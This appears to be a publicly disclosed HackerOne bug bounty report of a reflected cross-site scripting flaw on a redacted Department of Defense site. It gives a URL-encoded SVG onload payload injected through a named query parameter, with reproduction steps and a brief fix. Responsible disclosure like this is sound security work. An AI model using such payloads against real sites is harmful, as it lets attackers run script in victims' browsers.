# Reflected XSS on https://█████████/

## Report Details
- **Report ID**: 1065167
- **URL**: https://hackerone.com/reports/1065167
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-12-23T14:47:28.955Z
- **Disclosed**: 2021-02-01T17:47:32.810Z

## Reporter
- **Username**: nagli
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Vulnerable Website URL or Application:
```javascript
https://███████/███████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

##Description of Security Issue: (please limit to one site/app per submission)

Reflected XSS due to no input validation

██████████

##Steps needed to reproduce bug:
Navigate to
```javascript
https://███████/█████████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```
Choose whatever javascript you'd like to execute on the sub_div_ofc_sym_cd query parameter

##Remediation
Sanitize the input on the that parameter

##Best Regards
nagli

## Impact

Executing Javascript on behalf of the victim

## Attachments
No attachments
